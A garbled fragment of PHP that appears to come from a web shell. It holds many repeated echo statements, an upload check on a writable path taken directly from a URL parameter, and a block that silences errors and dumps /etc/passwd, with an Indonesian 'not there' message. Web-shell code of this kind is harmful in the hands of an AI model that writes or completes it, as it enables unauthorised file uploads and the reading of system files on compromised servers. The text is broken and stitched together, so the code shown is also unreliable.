...
?><?php echo $stat;?><?php echo $pwd; ?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php echo $d;?><?php
...
if(is_writable($_GET['upload'])){
	...
	?><?php echo $stat;?><?php echo $_GET['upload']; ?><?php echo $_GET['upload']; ?><?php echo $_GET['upload']; ?><?php echo $_GET['upload']; ?><?php echo $_GET['upload']; ?><?php
...
error_reporting(0);
?><?php if(!file("/etc/passwd")){ echo"/etc/passwd  gak adda";}else{ echo file_get_contents('/etc/passwd');}?><?php
